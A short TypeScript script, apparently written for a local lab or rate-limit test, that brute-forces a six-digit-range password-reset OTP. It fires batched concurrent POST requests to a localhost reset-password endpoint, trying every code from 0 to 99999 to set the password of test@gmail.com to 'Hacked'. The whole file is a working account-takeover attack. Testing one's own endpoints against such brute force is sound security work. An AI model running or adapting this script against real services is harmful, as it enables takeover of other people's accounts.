import axios from "axios";

async function sendRequest(otp: string) {
  let data = JSON.stringify({
    email: "test@gmail.com",
    otp: otp,
    newPassword: "Hacked",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    await axios.request(config);
  } catch {
    console.log("erorr sending request")
  }
}

async function main() {
  for (let i = 0; i < 100000; i += 100) {
    const p = [];
    for (let j = 0; j < 100; j++) {
      p.push(sendRequest((i + j).toString()));
      console.log(i+j)
    }
    // console.log(p);
    await Promise.all(p);
  }
}

main();
